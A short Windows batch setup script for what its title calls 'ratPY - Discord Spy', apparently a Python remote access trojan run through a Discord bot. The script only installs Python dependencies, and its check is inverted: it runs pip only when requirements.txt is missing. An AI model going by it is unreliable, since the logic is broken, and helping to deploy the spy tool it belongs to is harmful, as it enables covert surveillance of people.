@echo off
title ratPY - Discord Spy
if exist requirements.txt (
  echo You have all depedencies
  echo Go to "config" folder and setup the bot
  pause
  exit
) else (
  pip install -r requirements.txt
  echo All depedencies has been installed!
  echo Re-run "run.bat"
  pause
  exit
)